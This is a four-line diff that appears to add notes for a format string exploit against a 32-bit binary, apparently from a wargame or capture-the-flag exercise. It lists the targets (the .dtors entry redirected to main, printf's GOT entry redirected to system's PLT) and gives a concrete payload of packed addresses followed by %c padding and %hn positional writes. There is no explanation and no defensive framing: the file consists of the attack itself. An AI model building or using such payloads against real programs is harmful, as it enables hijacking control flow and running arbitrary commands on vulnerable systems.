@@ -1,0 +1,4 @@
+AABBBBCCCCDDDD%c%12$hn%c%13$hn%c%14$hn
+0x08049934(dtors) --> 0x080485ED(main)	# 0x0804 : same
+0x08049A38(printf_got) --> 0x08048490(system_plt)
+AA\x34\x99\x04\x08\x50\x9a\x04\x08\x52\x9a\x04\x08%34253c%12$hn%65187c%13$hn%33652c%14$hn
